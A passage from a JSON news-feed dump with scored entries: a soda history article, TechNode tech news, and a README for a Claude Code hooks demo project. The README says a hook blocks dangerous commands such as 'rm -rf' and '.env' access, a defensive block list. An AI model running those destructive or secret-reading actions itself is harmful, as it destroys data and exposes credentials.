adults, they’re also a hit with members of younger generations who try them. “People who grew up with them still love them today,” Graeter says. “We still make them in all of our stores, but they're not nearly as popular today as they once were, simply because milkshakes and smoothies have taken over.”  </span></p>\n<p><span style=\"font-weight: 400;\">According to Young, there is a commercially available descendant of </span><a href=\"https://www.coca-cola.com/us/en/brands/barq-s\"><span style=\"font-weight: 400;\">the nectar soda</span></a><span style=\"font-weight: 400;\">. “Commercial soda companies like Barqs and others came out with their version of cream soda—a bright pink soda—which got its flavoring from nectar soda,” he explains.</span></p>",
        "source": "www.atlasobscura.com",
        "published": "Tue, 03 Dec 2024 11:00:00 -0500",
        "fetched_at": "2026-02-09T23:34:22.475545Z",
        "tags": [
          {
            "name": "transformation",
            "score": 3
          },
          {
            "name": "boundary_crossing",
            "score": 4
          },
          {
            "name": "scale_shift",
            "score": 4
          }
        ],
        "structural_score": 11,
        "timeliness_score": 3,
        "final_score": 7.0,
        "reddit_score": null,
        "reddit_comments": null,
        "temp_score_struct": 8.6,
        "temp_score_trend": 5.3999999999999995
      }
    ],
    "bigtech": [
      {
        "url": "https://technode.com/2025/11/26/over-5000-global-attendees-celebrate-the-successful-debut-of-the-xin-summit-showcasing-the-next-generation-of-innovation-from-the-greater-bay-area-to-the-world/",
        "title": "Over 5,000 Global Attendees Celebrate the Successful Debut of the XIN Summit, Showcasing the Next Generation of Innovation From the Greater Bay Area to the World",
        "summary": "<figure><img alt=\"\" class=\"attachment-rss-image-size size-rss-image-size wp-post-image\" height=\"312\" src=\"https://i0.wp.com/technode.com/wp-content/uploads/2025/11/3.png?fit=556%2C312&amp;ssl=1\" width=\"556\" /></figure>The inaugural&#160;XIN Summit&#160;concluded on 16 November with a powerful debut presented by&#160;BEYOND Expo — Asia’s largest technology innovation and ecosystem event. Focused on&#160;AI Hardware Ecosystems and Frontier Technologies, the Summit connected&#160;Media Day, the 2025 “Next Star” Global Innovation Challenge Awards Ceremony, a two-day Innovation Summit, curated Innovation Exhibition, and high-efficiency investment matchmaking&#160;to demonstrate how technology, [&#8230;]",
        "source": "technode.com",
        "published": "Wed, 26 Nov 2025 01:51:46 +0000",
        "fetched_at": "2026-02-09T23:32:50.919435Z",
        "tags": [
          {
            "name": "boundary_crossing",
            "score": 7
          },
          {
            "name": "value_redefinition",
            "score": 4
          },
          {
            "name": "scale_shift",
            "score": 5
          }
        ],
        "structural_score": 16,
        "timeliness_score": 3,
        "final_score": 9.5,
        "reddit_score": null,
        "reddit_comments": null
      },
      {
        "url": "https://technode.com/2025/10/30/funflys-last-war-tops-global-mobile-game-revenue-chart-in-september-with-180-million-in-earnings/",
        "title": "Funfly’s Last War tops global mobile game revenue chart in September with $180 million in earnings",
        "summary": "<figure><img alt=\"\" class=\"attachment-rss-image-size size-rss-image-size wp-post-image\" height=\"491\" src=\"https://i0.wp.com/technode.com/wp-content/uploads/2025/10/last-war.png?fit=1024%2C491&amp;ssl=1\" width=\"1024\" /></figure>According to Sensor Tower, FUNFLY’s mobile title Last War topped the global mobile game revenue chart in September, earning an estimated RMB 1.3 billion ($180 million) in in-app purchases across iOS and Google Play. Last War: Survival Game is a SLG (Simulation and Strategy Game), featuring a chibi-style 3D art design, the game blends runner-shooter [&#8230;]",
        "source": "technode.com",
        "published": "Thu, 30 Oct 2025 02:08:57 +0000",
        "fetched_at": "2026-02-09T23:32:50.919831Z",
        "tags": [
          {
            "name": "boundary_crossing",
            "score": 7
          },
          {
            "name": "visibility_gain",
            "score": 4
          },
          {
            "name": "scale_shift",
            "score": 5
          }
        ],
        "structural_score": 16,
        "timeliness_score": 3,
        "final_score": 9.5,
        "reddit_score": null,
        "reddit_comments": null
      },
      {
        "url": "https://technode.com/2025/12/17/french-studio-drama-secures-tencent-investment-for-tactical-shooter-unrecord/",
        "title": "French studio Drama secures Tencent investment for tactical shooter Unrecord",
        "summary": "<figure><img alt=\"\" class=\"attachment-rss-image-size size-rss-image-size wp-post-image\" height=\"576\" src=\"https://i0.wp.com/technode.com/wp-content/uploads/2025/12/unrecord.jpg?fit=1024%2C576&amp;ssl=1\" width=\"1024\" /></figure>French independent game studio Drama Studios said its Unreal Engine 5–powered tactical shooter Unrecord has received a strategic investment from Tencent. The game, presented from the perspective of a police body camera, has drawn global attention for its cinematic visual quality and immersive narrative style. Unrecord previously surpassed 600,000 at its peak on Steam’s wishlist [&#8230;]",
        "source": "technode.com",
        "published": "Wed, 17 Dec 2025 10:03:37 +0000",
        "fetched_at": "2026-02-09T23:32:50.919125Z",
        "tags": [
          {
            "name": "boundary_crossing",
            "score": 4
          },
          {
            "name": "visibility_gain",
            "score": 4
          },
          {
            "name": "scale_shift",
            "score": 5
          }
        ],
        "structural_score": 13,
        "timeliness_score": 3,
        "final_score": 8.0,
        "reddit_score": null,
        "reddit_comments": null
      },
      {
        "url": "https://technode.com/2025/09/15/mit-technology-review-releases-2025-50-smartest-companies-list-recognizes-deepseek-game-science-and-unitree-robotics/",
        "title": "MIT Technology Review releases 2025 ’50 Smartest Companies’ list, recognizes Deepseek, Game Science and Unitree Robotics",
        "summary": "<figure><img alt=\"\" class=\"attachment-rss-image-size size-rss-image-size wp-post-image\" height=\"567\" src=\"https://i0.wp.com/technode.com/wp-content/uploads/2023/08/Beijing-forbids-generative-AI-in-online-medical-prescriptions-e1694161793934.jpg?fit=1024%2C567&amp;ssl=1\" width=\"1024\" /></figure>At the EmTech China 2025 Global Technology Summit last Friday, MIT Technology Review unveiled its annual list of the “50 Smartest Companies,” with Deepseek, Game Science, and Unitree Robotics earning spots in the ranking. Deepseek was recognized for achieving world-class model performance at low training costs — a breakthrough in algorithm optimization and resource efficiency [&#8230;]",
        "source": "technode.com",
        "published": "Mon, 15 Sep 2025 07:38:25 +0000",
        "fetched_at": "2026-02-09T23:32:50.920795Z",
        "tags": [
          {
            "name": "boundary_crossing",
            "score": 4
          },
          {
            "name": "visibility_gain",
            "score": 4
          },
          {
            "name": "scale_shift",
            "score": 5
          }
        ],
        "structural_score": 13,
        "timeliness_score": 3,
        "final_score": 8.0,
        "reddit_score": null,
        "reddit_comments": null
      },
      {
        "url": "https://technode.com/2025/10/09/vivo-x300-pro-to-debut-sony-lyt-828-gimbal-camera-with-enhanced-hdr-and-stabilization/",
        "title": "Vivo X300 Pro to debut Sony LYT-828 gimbal camera with enhanced HDR and stabilization",
        "summary": "<figure><img alt=\"\" class=\"attachment-rss-image-size size-rss-image-size wp-post-image\" height=\"596\" src=\"https://i0.wp.com/technode.com/wp-content/uploads/2025/10/vivo-x300.png?fit=1024%2C596&amp;ssl=1\" width=\"1024\" /></figure>Vivo announced on Wednesday that its upcoming X300 Pro will make the global debut of Sony’s LYT-828, a gimbal-level main camera sensor. The 50MP sensor features a large 1/1.28-inch size and an f/1.57 aperture, offering CIPA 5.5-level stabilization. With Hybrid Frame-HDR fusion technology, it offers a 100dB dynamic range for improved backlit and low-light performance. [&#8230;]",
        "source": "technode.com",
        "published": "Thu, 09 Oct 2025 09:43:32 +0000",
        "fetched_at": "2026-02-09T23:32:50.920379Z",
        "tags": [
          {
            "name": "boundary_crossing",
            "score": 2
          },
          {
            "name": "visibility_gain",
            "score": 5
          },
          {
            "name": "scale_shift",
            "score": 5
          }
        ],
        "structural_score": 12,
        "timeliness_score": 3,
        "final_score": 7.5,
        "reddit_score": null,
        "reddit_comments": null
      },
      {
        "url": "https://technode.com/2025/08/19/preview-of-chinese-game-developers-at-gamescom-2025%ef%bc%9ablack-myth-wukong-wuxia-rpgs-and-more/",
        "title": "Preview of Chinese game developers at Gamescom 2025：Black Myth Wukong, wuxia, RPGs and more",
        "summary": "<figure><img alt=\"\" class=\"attachment-rss-image-size size-rss-image-size wp-post-image\" height=\"607\" src=\"https://i0.wp.com/technode.com/wp-content/uploads/2025/08/blade-2.png?fit=1024%2C607&amp;ssl=1\" width=\"1024\" /></figure>As one of the world’s largest gaming events, Gamescom has become a key bridge between Europe and the global industry. This year, several Chinese games will debut new trailers or offer hands-on demos to overseas players for the very first time, signaling both confidence in their products and a deeper commitment to engaging with international [&#8230;]",
        "source": "technode.com",
        "published": "Tue, 19 Aug 2025 09:58:32 +0000",
        "fetched_at": "2026-02-09T23:32:50.921203Z",
        "tags": [
          {
            "name": "boundary_crossing",
            "score": 2
          },
          {
            "name": "visibility_gain",
            "score": 4
          },
          {
            "name": "scale_shift",
            "score": 5
          }
        ],
        "structural_score": 11,
        "timeliness_score": 3,
        "final_score": 7.0,
        "reddit_score": null,
        "reddit_comments": null
      },
      {
        "url": "https://technode.com/2025/08/12/renault-and-geely-collaborate-to-make-electric-suv-for-overseas-markets-report/",
        "title": "Renault and Geely collaborate to make electric SUV for overseas markets: report",
        "summary": "<figure><img alt=\"\" class=\"attachment-rss-image-size size-rss-image-size wp-post-image\" height=\"350\" src=\"https://i0.wp.com/technode.com/wp-content/uploads/2024/09/1-1.png?fit=700%2C350&amp;ssl=1\" width=\"700\" /></figure>Renault is developing an electric sports utility vehicle built on the newest platform from Geely called the Global Intelligent New Energy Architecture (GEA), one of the company’s core technologies that has underpinned the success of its Galaxy lineup, as reported by Chinese media publication AutoPix. The new SUV will have both all-electric and plug-in hybrid [&#8230;]",
        "source": "technode.com",
        "published": "Tue, 12 Aug 2025 09:10:21 +0000",
        "fetched_at": "2026-02-09T23:32:50.921319Z",
        "tags": [
          {
            "name": "boundary_crossing",
            "score": 2
          },
          {
            "name": "scale_shift",
            "score": 9
          }
        ],
        "structural_score": 11,
        "timeliness_score": 3,
        "final_score": 7.0,
        "reddit_score": null,
        "reddit_comments": null
      },
      {
        "url": "https://technode.com/2025/04/12/huawei-patent-reinvents-periscope-camera-with-retractable-design-reducing-camera-bump/",
        "title": "Huawei patent reinvents periscope camera with retractable design reducing camera bump",
        "summary": "<figure><img alt=\"\" class=\"attachment-rss-image-size size-rss-image-size wp-post-image\" height=\"683\" src=\"https://i0.wp.com/technode.com/wp-content/uploads/2023/09/151451493_l_normal_none-scaled.jpg?fit=1024%2C683&amp;ssl=1\" width=\"1024\" /></figure>Source @xleaks7 revealed on platform X that the United States Patent and Trademark Office (USPTO) approved a Huawei patent last month. According to the patent, Huawei proposes using a drive motor to adjust the distance between the camera module and the image sensor, aiming to enhance the zoom performance of telephoto lenses while maintaining a [&#8230;]",
        "source": "technode.com",
        "published": "Sat, 12 Apr 2025 12:50:52 +0000",
        "fetched_at": "2026-02-09T23:32:50.924613Z",
        "tags": [
          {
            "name": "boundary_crossing",
            "score": 6
          },
          {
            "name": "visibility_gain",
            "score": 5
          }
        ],
        "structural_score": 11,
        "timeliness_score": 3,
        "final_score": 7.0,
        "reddit_score": null,
        "reddit_comments": null
      },
      {
        "url": "https://technode.com/2025/10/27/huawei-vivo-and-oppo-help-establish-first-global-fast-charging-standard-under-itu/",
        "title": "Huawei, vivo, and OPPO help establish first global fast-charging standard under ITU",
        "summary": "<figure><img alt=\"\" class=\"attachment-rss-image-size size-rss-image-size wp-post-image\" height=\"683\" src=\"https://i0.wp.com/technode.com/wp-content/uploads/2025/10/charger-marcus-urbenz-4xMAiJZPQXI-unsplash.jpg?fit=1024%2C683&amp;ssl=1\" width=\"1024\" /></figure>The International Telecommunication Union (ITU) has approved and released L.1004, a universal fast-charging standard for mobile terminals co-authored by China’s CAICT with Huawei, vivo, and OPPO. The standard enables cross-brand and cross-device fast charging and is intended to reduce charger duplication and electronic waste. [TechNode reporting]",
        "source": "technode.com",
        "published": "Mon, 27 Oct 2025 10:51:44 +0000",
        "fetched_at": "2026-02-09T23:32:50.919915Z",
        "tags": [
          {
            "name": "transformation",
            "score": 3
          },
          {
            "name": "boundary_crossing",
            "score": 2
          },
          {
            "name": "scale_shift",
            "score": 5
          }
        ],
        "structural_score": 10,
        "timeliness_score": 3,
        "final_score": 6.5,
        "reddit_score": null,
        "reddit_comments": null
      },
      {
        "url": "https://technode.com/2025/01/15/dji-launches-dji-flip-a-foldable-drone-with-hand-launch-and-ai-features/",
        "title": "DJI launches DJI Flip, a foldable drone with hand launch and AI features",
        "summary": "<figure><img alt=\"DJI currently accounts for over half of all commercial drone sales in the US.\" class=\"attachment-rss-image-size size-rss-image-size wp-post-image\" height=\"510\" src=\"https://i0.wp.com/technode.com/wp-content/uploads/2025/01/DJI-Flip.png?fit=1024%2C510&amp;ssl=1\" width=\"1024\" /></figure>Chinese drone-maker DJI on Tuesday launched the DJI Flip, a foldable drone equipped with a 1/1.3-inch image sensor capable of shooting 4K/60fps HDR videos. Weighing under 249 grams, the foldable model features a protective cover, 31-minute flight time, AI smart tracking, and hand-launch capability without a remote. Why it matters: The DJI Flip combines portability, [&#8230;]",
        "source": "technode.com",
        "published": "Wed, 15 Jan 2025 09:27:53 +0000",
        "fetched_at": "2026-02-09T23:32:50.926271Z",
        "tags": [
          {
            "name": "boundary_crossing",
            "score": 6
          },
          {
            "name": "visibility_gain",
            "score": 4
          }
        ],
        "structural_score": 10,
        "timeliness_score": 3,
        "final_score": 6.5,
        "reddit_score": null,
        "reddit_comments": null
      }
    ],
    "devcommunity": [
      {
        "url": "https://github.com/disler/claude-code-hooks-mastery",
        "title": "disler/claude-code-hooks-mastery",
        "summary": "<p>Master Claude Code Hooks</p><hr /><h1>Claude Code Hooks Mastery</h1> \n<p><a href=\"https://docs.anthropic.com/en/docs/claude-code/hooks\">Claude Code Hooks</a> - Quickly master how to use Claude Code hooks to add deterministic (or non-deterministic) control over Claude Code's behavior. Plus learn about <a href=\"https://raw.githubusercontent.com/disler/claude-code-hooks-mastery/main/#claude-code-sub-agents\">Claude Code Sub-Agents</a>, the powerful <a href=\"https://raw.githubusercontent.com/disler/claude-code-hooks-mastery/main/#the-meta-agent\">Meta-Agent</a>, and <a href=\"https://raw.githubusercontent.com/disler/claude-code-hooks-mastery/main/#team-based-validation-system\">Team-Based Validation</a> with agent orchestration.</p> \n<img alt=\"Claude Code Hooks\" src=\"https://raw.githubusercontent.com/disler/claude-code-hooks-mastery/main/images/hooked.png\" style=\"width: 100%;\" /> \n<h2>Table of Contents</h2> \n<ul> \n <li><a href=\"https://raw.githubusercontent.com/disler/claude-code-hooks-mastery/main/#prerequisites\">Prerequisites</a></li> \n <li><a href=\"https://raw.githubusercontent.com/disler/claude-code-hooks-mastery/main/#hook-lifecycle--payloads\">Hook Lifecycle &amp; Payloads</a></li> \n <li><a href=\"https://raw.githubusercontent.com/disler/claude-code-hooks-mastery/main/#what-this-shows\">What This Shows</a></li> \n <li><a href=\"https://raw.githubusercontent.com/disler/claude-code-hooks-mastery/main/#uv-single-file-scripts-architecture\">UV Single-File Scripts Architecture</a></li> \n <li><a href=\"https://raw.githubusercontent.com/disler/claude-code-hooks-mastery/main/#key-files\">Key Files</a></li> \n <li><a href=\"https://raw.githubusercontent.com/disler/claude-code-hooks-mastery/main/#features-demonstrated\">Features Demonstrated</a></li> \n <li><a href=\"https://raw.githubusercontent.com/disler/claude-code-hooks-mastery/main/#hook-error-codes--flow-control\">Hook Error Codes &amp; Flow Control</a></li> \n <li><a href=\"https://raw.githubusercontent.com/disler/claude-code-hooks-mastery/main/#userpromptsubmit-hook-deep-dive\">UserPromptSubmit Hook Deep Dive</a></li> \n <li><a href=\"https://raw.githubusercontent.com/disler/claude-code-hooks-mastery/main/#claude-code-sub-agents\">Claude Code Sub-Agents</a></li> \n <li><a href=\"https://raw.githubusercontent.com/disler/claude-code-hooks-mastery/main/#team-based-validation-system\">Team-Based Validation System</a></li> \n <li><a href=\"https://raw.githubusercontent.com/disler/claude-code-hooks-mastery/main/#output-styles-collection\">Output Styles Collection</a></li> \n <li><a href=\"https://raw.githubusercontent.com/disler/claude-code-hooks-mastery/main/#custom-status-lines\">Custom Status Lines</a></li> \n</ul> \n<h2>Prerequisites</h2> \n<p>This requires:</p> \n<ul> \n <li><strong><a href=\"https://docs.astral.sh/uv/getting-started/installation/\">Astral UV</a></strong> - Fast Python package installer and resolver</li> \n <li><strong><a href=\"https://docs.anthropic.com/en/docs/claude-code\">Claude Code</a></strong> - Anthropic's CLI for Claude AI</li> \n</ul> \n<h3>Optional Setup:</h3> \n<p>Optional:</p> \n<ul> \n <li><strong><a href=\"https://elevenlabs.io/\">ElevenLabs</a></strong> - Text-to-speech provider (with MCP server integration)</li> \n <li><strong><a href=\"https://github.com/elevenlabs/elevenlabs-mcp\">ElevenLabs MCP Server</a></strong> - MCP server for ElevenLabs</li> \n <li><strong><a href=\"https://www.firecrawl.dev/mcp\">Firecrawl MCP Server</a></strong> - Web scraping and crawling MCP server (my favorite scraper)</li> \n <li><strong><a href=\"https://openai.com/\">OpenAI</a></strong> - Language model provider + Text-to-speech provider</li> \n <li><strong><a href=\"https://www.anthropic.com/\">Anthropic</a></strong> - Language model provider</li> \n <li><strong><a href=\"https://ollama.com/\">Ollama</a></strong> - Local language model provider</li> \n</ul> \n<h2>Hook Lifecycle &amp; Payloads</h2> \n<p>This demo captures all 13 Claude Code hook lifecycle events with their JSON payloads:</p> \n<h3>Hook Lifecycle Overview</h3> \n<pre><code class=\"language-mermaid\">flowchart TB\n    subgraph SESSION[\"🟢 Session Lifecycle\"]\n        direction TB\n        SETUP[[\"🔧 Setup&lt;br/&gt;(init/maintenance)\"]]\n        START[[\"▶️ SessionStart&lt;br/&gt;(startup/resume/clear)\"]]\n        END[[\"⏹️ SessionEnd&lt;br/&gt;(exit/sigint/error)\"]]\n    end\n\n    subgraph MAIN[\"🔄 Main Conversation Loop\"]\n        direction TB\n        PROMPT[[\"📝 UserPromptSubmit\"]]\n        CLAUDE[\"Claude Processes\"]\n\n        subgraph TOOLS[\"🛠️ Tool Execution\"]\n            direction TB\n            PRE[[\"🔒 PreToolUse\"]]\n            PERM[[\"❓ PermissionRequest\"]]\n            EXEC[\"Tool Executes\"]\n            POST[[\"✅ PostToolUse\"]]\n            FAIL[[\"❌ PostToolUseFailure\"]]\n        end\n\n        subgraph SUBAGENT[\"🤖 Subagent Lifecycle\"]\n            direction TB\n            SSTART[[\"🚀 SubagentStart\"]]\n            SWORK[\"Subagent Works\"]\n            SSTOP[[\"🏁 SubagentStop\"]]\n        end\n\n        NOTIFY[[\"🔔 Notification&lt;br/&gt;(Async)\"]]\n        STOP[[\"🛑 Stop\"]]\n    end\n\n    subgraph COMPACT[\"🗜️ Maintenance\"]\n        PRECOMPACT[[\"📦 PreCompact\"]]\n    end\n\n    SETUP --&gt; START\n    START --&gt; PROMPT\n    PROMPT --&gt; CLAUDE\n    CLAUDE --&gt; PRE\n    PRE --&gt; PERM\n    PERM --&gt; EXEC\n    EXEC --&gt; POST\n    EXEC -.-&gt; FAIL\n    CLAUDE -.-&gt; SSTART\n    SSTART --&gt; SWORK\n    SWORK --&gt; SSTOP\n    POST --&gt; CLAUDE\n    CLAUDE --&gt; STOP\n    CLAUDE -.-&gt; NOTIFY\n    STOP --&gt; PROMPT\n    STOP -.-&gt; END\n    PROMPT -.-&gt; PRECOMPACT\n    PRECOMPACT -.-&gt; PROMPT\n</code></pre> \n<h3>1. UserPromptSubmit Hook</h3> \n<p><strong>Fires:</strong> Immediately when user submits a prompt (before Claude processes it)<br /> <strong>Payload:</strong> <code>prompt</code> text, <code>session_id</code>, timestamp<br /> <strong>Enhanced:</strong> Prompt validation, logging, context injection, security filtering</p> \n<h3>2. PreToolUse Hook</h3> \n<p><strong>Fires:</strong> Before any tool execution<br /> <strong>Payload:</strong> <code>tool_name</code>, <code>tool_input</code> parameters<br /> <strong>Enhanced:</strong> Blocks dangerous commands (<code>rm -rf</code>, <code>.env</code> access)</p> \n<h3>3. PostToolUse Hook</h3> \n<p><strong>Fires:</strong> After successful tool completion<br /> <strong>Payload:</strong> <code>tool_name</code>, <code>tool_input</code>, <code>tool_response</code> with results</p> \n<h3>4. Notification Hook</h3> \n<p><strong>Fires:</strong> When Claude Code sends notifications (waiting for input, etc.)<br /> <strong>Payload:</strong> <code>message</code> content<br /> <strong>Enhanced:</strong> TTS alerts - \"Your agent needs your input\" (30% chance includes name)</p> \n<h3>5. Stop Hook</h3> \n<p><strong>Fires:</strong> When Claude Code finishes responding<br /> <strong>Payload:</strong> <code>stop_hook_active</code> boolean flag<br /> <strong>Enhanced:</strong> AI-generated completion messages with TTS playback (LLM priority: OpenAI &gt; Anthropic &gt; Ollama &gt; random)</p> \n<h3>6. SubagentStop Hook</h3> \n<p><strong>Fires:</strong> When Claude Code subagents (Task tools) finish responding<br /> <strong>Payload:</strong> <code>stop_hook_active</code> boolean flag<br /> <strong>Enhanced:</strong> TTS playback - \"Subagent Complete\"</p> \n<h3>7. PreCompact Hook</h3> \n<p><strong>Fires:</strong> Before Claude Code performs a compaction operation<br /> <strong>Payload:</strong> <code>trigger</code> (\"manual\" or \"auto\"), <code>custom_instructions</code> (for manual), session info<br /> <strong>Enhanced:</strong> Transcript backup, verbose feedback for manual compaction</p> \n<h3>8. SessionStart Hook</h3> \n<p><strong>Fires:</strong> When Claude Code starts a new session or resumes an existing one <strong>Payload:</strong> <code>source</code> (\"startup\", \"resume\", or \"clear\"), session info <strong>Enhanced:</strong> Development context loading (git status, recent issues, context files)</p> \n<h3>9. SessionEnd Hook</h3> \n<p><strong>Fires:</strong> When Claude Code session ends (exit, sigint, or error) <strong>Payload:</strong> <code>session_id</code>, <code>transcript_path</code>, <code>cwd</code>, <code>permission_mode</code>, <code>reason</code> <strong>Enhanced:</strong> Session logging with optional cleanup tasks (removes temp files, stale logs)</p> \n<h3>10. PermissionRequest Hook</h3> \n<p><strong>Fires:</strong> When user is shown a permission dialog <strong>Payload:</strong> <code>tool_name</code>, <code>tool_input</code>, <code>tool_use_id</code>, session info <strong>Enhanced:</strong> Permission auditing, auto-allow for read-only ops (Read, Glob, Grep, safe Bash)</p> \n<h3>11. PostToolUseFailure Hook</h3> \n<p><strong>Fires:</strong> When a tool execution fails <strong>Payload:</strong> <code>tool_name</code>, <code>tool_input</code>, <code>tool_use_id</code>, <code>error</code> object <strong>Enhanced:</strong> Structured error logging with timestamps and full context</p> \n<h3>12. SubagentStart Hook</h3> \n<p><strong>Fires:</strong> When a subagent (Task tool) spawns <strong>Payload:</strong> <code>agent_id</code>, <code>agent_type</code>, session info <strong>Enhanced:</strong> Subagent spawn logging with optional TTS announcement</p> \n<h3>13. Setup Hook</h3> \n<p><strong>Fires:</strong> When Claude enters a repository (init) or periodically (maintenance) <strong>Payload:</strong> <code>trigger</code> (\"init\" or \"maintenance\"), session info <strong>Enhanced:</strong> Environment persistence via <code>CLAUDE_ENV_FILE</code>, context injection via <code>additionalContext</code></p> \n<h2>What This Shows</h2> \n<ul> \n <li><strong>Complete hook lifecycle coverage</strong> - All 13 hook events implemented and logging (11/13 validated via automated testing)</li> \n <li><strong>Prompt-level control</strong> - UserPromptSubmit validates and enhances prompts before Claude sees them</li> \n <li><strong>Intelligent TTS system</strong> - AI-generated audio feedback with voice priority (ElevenLabs &gt; OpenAI &gt; pyttsx3)</li> \n <li><strong>Security enhancements</strong> - Blocks dangerous commands and sensitive file access at multiple levels</li> \n <li><strong>Personalized experience</strong> - Uses engineer name from environment variables</li> \n <li><strong>Automatic logging</strong> - All hook events are logged as JSON to <code>logs/</code> directory</li> \n <li><strong>Chat transcript extraction</strong> - PostToolUse hook converts JSONL transcripts to readable JSON format</li> \n <li><strong>Team-based validation</strong> - Builder/Validator agent pattern with code quality hooks</li> \n</ul> \n<blockquote> \n <p><strong>Warning:</strong> The <code>chat.json</code> file contains only the most recent Claude Code conversation. It does not preserve conversations from previous sessions - each new conversation is fully copied and overwrites the previous one. This is unlike the other logs which are appended to from every claude code session.</p> \n</blockquote> \n<h2>UV Single-File Scripts Architecture</h2> \n<p>This project leverages <strong><a href=\"https://docs.astral.sh/uv/guides/scripts/\">UV single-file scripts</a></strong> to keep hook logic cleanly separated from your main codebase. All hooks live in <code>.claude/hooks/</code> as standalone Python scripts with embedded dependency declarations.</p> \n<p><strong>Benefits:</strong></p> \n<ul> \n <li><strong>Isolation</strong> - Hook logic stays separate from your project dependencies</li> \n <li><strong>Portability</strong> - Each hook script declares its own dependencies inline</li> \n <li><strong>No Virtual Environment Management</strong> - UV handles dependencies automatically</li> \n <li><strong>Fast Execution</strong> - UV's dependency resolution is lightning-fast</li> \n <li><strong>Self-Contained</strong> - Each hook can be understood and modified independently</li> \n</ul> \n<p>This approach ensures your hooks remain functional across different environments without polluting your main project's dependency tree.</p> \n<h2>Key Files</h2> \n<ul> \n <li><code>.claude/settings.json</code> - Hook configuration with permissions</li> \n <li><code>.claude/hooks/</code> - Python scripts using uv for each hook type \n  <ul> \n   <li><code>user_prompt_submit.py</code> - Prompt validation, logging, and context injection</li> \n   <li><code>pre_tool_use.py</code> - Security blocking and logging</li> \n   <li><code>post_tool_use.py</code> - Logging and transcript conversion</li> \n   <li><code>post_tool_use_failure.py</code> - Error logging with structured details</li> \n   <li><code>notification.py</code> - Logging with optional TTS (--notify flag)</li> \n   <li><code>stop.py</code> - AI-generated completion messages with TTS</li> \n   <li><code>subagent_stop.py</code> - Simple \"Subagent Complete\" TTS</li> \n   <li><code>subagent_start.py</code> - Subagent spawn logging with optional TTS</li> \n   <li><code>pre_compact.py</code> - Transcript backup and compaction logging</li> \n   <li><code>session_start.py</code> - Development context loading and session logging</li> \n   <li><code>session_end.py</code> - Session cleanup and logging</li> \n   <li><code>permission_request.py</code> - Permission auditing and auto-allow</li> \n   <li><code>setup.py</code> - Repository initialization and maintenance</li> \n   <li><code>validators/</code> - Code quality validation hooks \n    <ul> \n     <li><code>ruff_validator.py</code> - Python linting via Ruff (PostToolUse)</li> \n     <li><code>ty_validator.py</code> - Python type checking (PostToolUse)</li> \n    </ul> </li> \n   <li><code>utils/</code> - Intelligent TTS and LLM utility scripts \n    <ul> \n     <li><code>tts/</code> - Text-to-speech providers (ElevenLabs, OpenAI, pyttsx3) \n      <ul> \n       <li><code>tts_queue.py</code> - Queue-based TTS management (prevents overlapping audio)</li> \n      </ul> </li> \n     <li><code>llm/</code> - Language model integrations (OpenAI, Anthropic, Ollama) \n      <ul> \n       <li><code>task_summarizer.py</code> - LLM-powered task completion summaries</li> \n      </ul> </li> \n    </ul> </li> \n  </ul> </li> \n <li><code>.claude/status_lines/</code> - Real-time terminal status displays \n  <ul> \n   <li><code>status_line.py</code> - Basic MVP with git info</li> \n   <li><code>status_line_v2.py</code> - Smart prompts with color coding</li> \n   <li><code>status_line_v3.py</code> - Agent sessions with history</li> \n   <li><code>status_line_v4.py</code> - Extended metadata support</li> \n   <li><code>status_line_v5.py</code> - Cost tracking with line changes</li> \n   <li><code>status_line_v6.py</code> - Context window usage bar</li> \n   <li><code>status_line_v7.py</code> - Session duration timer</li> \n   <li><code>status_line_v8.py</code> - Token usage with cache stats</li> \n   <li><code>status_line_v9.py</code> - Minimal powerline style</li> \n  </ul> </li> \n <li><code>.claude/output-styles/</code> - Response formatting configurations \n  <ul> \n   <li><code>genui.md</code> - Generates beautiful HTML with embedded styling</li> \n   <li><code>table-based.md</code> - Organizes information in markdown tables</li> \n   <li><code>yaml-structured.md</code> - YAML configuration format</li> \n   <li><code>bullet-points.md</code> - Clean nested lists</li> \n   <li><code>ultra-concise.md</code> - Minimal words, maximum speed</li> \n   <li><code>html-structured.md</code> - Semantic HTML5</li> \n   <li><code>markdown-focused.md</code> - Rich markdown features</li> \n   <li><code>tts-summary.md</code> - Audio feedback via TTS</li> \n  </ul> </li> \n <li><code>.claude/commands/</code> - Custom slash commands \n  <ul> \n   <li><code>prime.md</code> - Project analysis and understanding</li> \n   <li><code>plan_w_team.md</code> - Team-based build/validate workflow</li> \n   <li><code>crypto_research.md</code> - Cryptocurrency research workflows</li> \n   <li><code>cook.md</code> - Advanced task execution</li> \n   <li><code>update_status_line.md</code> - Dynamic status updates</li> \n  </ul> </li> \n <li><code>.claude/agents/</code> - Sub-agent configurations \n  <ul> \n   <li><code>crypto/</code> - Cryptocurrency analysis agents</li> \n   <li><code>team/</code> - Team-based workflow agents \n    <ul> \n     <li><code>builder.md</code> - Implementation agent (all tools)</li> \n     <li><code>validator.md</code> - Read-only validation agent</li> \n    </ul> </li> \n   <li><code>hello-world-agent.md</code> - Simple greeting example</li> \n   <li><code>llm-ai-agents-and-eng-research.md</code> - AI research specialist</li> \n   <li><code>meta-agent.md</code> - Agent that creates other agents</li> \n   <li><code>work-completion-summary.md</code> - Audio summary generator</li> \n  </ul> </li> \n <li><code>logs/</code> - JSON logs of all hook executions \n  <ul> \n   <li><code>user_prompt_submit.json</code> - User prompt submissions with validation</li> \n   <li><code>pre_tool_use.json</code> - Tool use events with security blocking</li> \n   <li><code>post_tool_use.json</code> - Tool completion events</li> \n   <li><code>post_tool_use_failure.json</code> - Tool failure events with error details</li> \n   <li><code>notification.json</code> - Notification events</li> \n   <li><code>stop.json</code> - Stop events with completion messages</li> \n   <li><code>subagent_stop.json</code> - Subagent completion events</li> \n   <li><code>subagent_start.json</code> - Subagent spawn events</li> \n   <li><code>pre_compact.json</code> - Pre-compaction events with trigger type</li> \n   <li><code>session_start.json</code> - Session start events with source type</li> \n   <li><code>session_end.json</code> - Session end events with reason</li> \n   <li><code>permission_request.json</code> - Permission request audit log</li> \n   <li><code>setup.json</code> - Setup events with trigger type</li> \n   <li><code>chat.json</code> - Readable conversation transcript (generated by --chat flag)</li> \n  </ul> </li> \n <li><code>ai_docs/</code> - Documentation resources \n  <ul> \n   <li><code>cc_hooks_docs.md</code> - Complete hooks documentation from Anthropic</li> \n   <li><code>claude_code_status_lines_docs.md</code> - Status line input schema and configuration</li> \n   <li><code>user_prompt_submit_hook.md</code> - Comprehensive UserPromptSubmit hook documentation</li> \n   <li><code>uv-single-file-scripts.md</code> - UV script architecture documentation</li> \n   <li><code>anthropic_custom_slash_commands.md</code> - Slash commands documentation</li> \n   